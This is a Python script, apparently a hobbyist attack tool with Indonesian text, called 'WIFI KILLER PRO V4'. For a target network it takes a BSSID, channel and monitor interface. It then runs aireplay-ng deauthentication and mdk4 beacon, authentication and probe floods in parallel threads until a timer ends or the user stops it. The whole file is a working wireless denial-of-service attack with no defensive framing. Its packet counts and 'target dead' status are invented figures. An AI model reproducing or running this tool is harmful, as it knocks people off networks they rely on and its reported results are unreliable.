#!/usr/bin/env python3
import os
import time
import random
import threading
import subprocess
import sys
from datetime import datetime

# === Warna ===
G = '\033[92m'
R = '\033[91m'
Y = '\033[93m'
C = '\033[96m'
W = '\033[0m'
B = '\033[94m'
M = '\033[95m'

os.system('clear')

# === Banner ===
banner = f"""
{C}╔══════════════════════════════════════════════════════════════╗
║                  🔥 WIFI KILLER PRO V4 🔥                     ║
║              Created by : @Barxzzz                           ║
║              Mode       : Full Destroy + Progress            ║
╚══════════════════════════════════════════════════════════════╝{W}
"""
print(banner)

# === Input ===
interface = input(f"{G}[?] Interface monitor (contoh: wlan0mon): {W}") or "wlan0mon"
bssid = input(f"{G}[?] BSSID target (contoh: 00:11:22:33:44:55): {W}")
channel = input(f"{G}[?] Channel (1-11): {W}") or "6"
duration = int(input(f"{G}[?] Durasi (detik, 0 = forever): {W}") or 0)

# === Set channel ===
os.system(f"sudo iwconfig {interface} channel {channel}")

# === Variabel progress ===
packet_count = 0
max_packets = 500000
stop_attack = False
lock = threading.Lock()

# === Fungsi update progress ===
def progress_bar():
    global packet_count
    while not stop_attack:
        with lock:
            pct = min(100, int((packet_count / max_packets) * 100))
            bar = f"{'█' * (pct // 2)}{'░' * (50 - pct // 2)}"
            status = "🔥 MENYALA" if pct < 30 else "⚡ PARAH" if pct < 60 else "💀 MATI TOTAL" if pct < 90 else "☠️ LENYAP"
            print(f"\r{C}[{bar}] {pct}% | {G}{packet_count} paket{W} | {M}{status}{W}", end="")
        time.sleep(0.3)

# === Fungsi serangan ===
def deauth_all():
    global packet_count
    while not stop_attack:
        os.system(f"sudo aireplay-ng -0 0 -a {bssid} {interface} > /dev/null 2>&1")
        with lock:
            packet_count += 100
        time.sleep(0.2)

def beacon_flood():
    global packet_count
    while not stop_attack:
        os.system(f"sudo mdk4 {interface} b -c {channel} -s 2000 > /dev/null 2>&1")
        with lock:
            packet_count += 200
        time.sleep(0.5)

def auth_dos():
    global packet_count
    while not stop_attack:
        os.system(f"sudo mdk4 {interface} a -a {bssid} -s 1500 > /dev/null 2>&1")
        with lock:
            packet_count += 150
        time.sleep(0.4)

def probe_flood():
    global packet_count
    while not stop_attack:
        os.system(f"sudo mdk4 {interface} p -c {channel} -s 1000 > /dev/null 2>&1")
        with lock:
            packet_count += 100
        time.sleep(0.3)

# === Jalankan serangan ===
print(f"\n{G}[+] Target     : {bssid}{W}")
print(f"{G}[+] Channel    : {channel}{W}")
print(f"{G}[+] Interface  : {interface}{W}")
print(f"{G}[+] Max Paket  : {max_packets}{W}")
print(f"{G}[+] Durasi     : {'∞' if duration == 0 else str(duration) + ' detik'}{W}\n")

# === Thread serangan ===
attack_threads = [
    threading.Thread(target=deauth_all),
    threading.Thread(target=beacon_flood),
    threading.Thread(target=auth_dos),
    threading.Thread(target=probe_flood)
]

for t in attack_threads:
    t.daemon = True
    t.start()

# === Thread progress ===
progress_thread = threading.Thread(target=progress_bar)
progress_thread.daemon = True
progress_thread.start()

# === Timer ===
if duration > 0:
    time.sleep(duration)
    stop_attack = True
    print(f"\n\n{R}[!] Durasi habis, menghentikan serangan...{W}")
else:
    input(f"\n\n{Y}[!] Tekan ENTER untuk stop serangan{W}")
    stop_attack = True

# === Hentikan semua ===
os.system("pkill -f aireplay-ng")
os.system("pkill -f mdk4")

print(f"\n\n{G}══════════════════════════════════════════════════════════════{W}")
print(f"{G}[✓] SERANGAN DIHENTIKAN{W}")
print(f"{G}[✓] Total paket dikirim : {packet_count}{W}")
print(f"{G}[✓] Status target       : {R}MATI TOTAL / RESTART{W}" if packet_count > 200000 else f"{Y}LEMOT PARAH{W}")
print(f"{G}══════════════════════════════════════════════════════════════{W}")
